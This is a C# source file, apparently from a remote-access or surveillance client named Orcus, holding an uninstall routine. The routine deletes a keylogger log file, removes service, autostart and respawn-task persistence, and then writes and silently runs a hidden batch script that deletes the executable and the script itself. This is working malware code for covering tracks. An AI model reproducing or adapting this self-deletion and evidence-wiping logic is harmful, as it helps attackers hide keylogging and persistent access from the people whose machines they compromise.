using System;
using System.Diagnostics;
using System.IO;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Protection;
using Orcus.Service;
using Orcus.Shared.Utilities;

namespace Orcus.Core
{
    public static class UninstallHelper
    {
        public static void UninstallAndClose()
        {
            RemoveAllDependencies();
            RemovePrivateFiles();
            RemoveOtherStuff();
            UninstallPlugins();

            PrepareOrcusFileToRemove();

            var deleteScript = GetApplicationDeletingScript();
            Program.Unload();
            Process.Start(deleteScript);
            Program.Exit();
        }

        public static void RemoveOtherStuff()
        {
            try
            {
                RespawnTask.RemoveRespawnTask();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static void RemovePrivateFiles()
        {
            try
            {
                if (File.Exists(Consts.KeyLogFile))
                    File.Delete(Consts.KeyLogFile);
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                if (File.Exists(Consts.ExceptionFile))
                    File.Delete(Consts.ExceptionFile);
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                if (Directory.Exists(Consts.PluginsDirectory))
                    Directory.Delete(Consts.PluginsDirectory, true);
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static void RemoveAllDependencies()
        {
            try
            {
                ServiceInstaller.Uninstall();
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                Autostarter.RemoveFromAutostart();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static void PrepareOrcusFileToRemove()
        {
            File.SetAttributes(Consts.ApplicationPath, FileAttributes.Normal);
        }

        public static ProcessStartInfo GetApplicationDeletingScript()
        {
            var assemblyPath = Consts.ApplicationPath;
            var removeScriptFile = FileExtensions.GetFreeTempFileName("bat");

            var batchScript =
                $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{assemblyPath}\"\r\necho j | del {removeScriptFile}";
            File.WriteAllText(removeScriptFile, batchScript);

            return new ProcessStartInfo(removeScriptFile) {WindowStyle = ProcessWindowStyle.Hidden};
        }

        public static void UninstallPlugins()
        {
            if (PluginLoader.Current.Loadables.Count > 0)
            {
                foreach (var clientPlugin in PluginLoader.Current.Loadables)
                {
                    try
                    {
                        clientPlugin.Uninstall(Consts.ApplicationPath);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }
        }
    }
}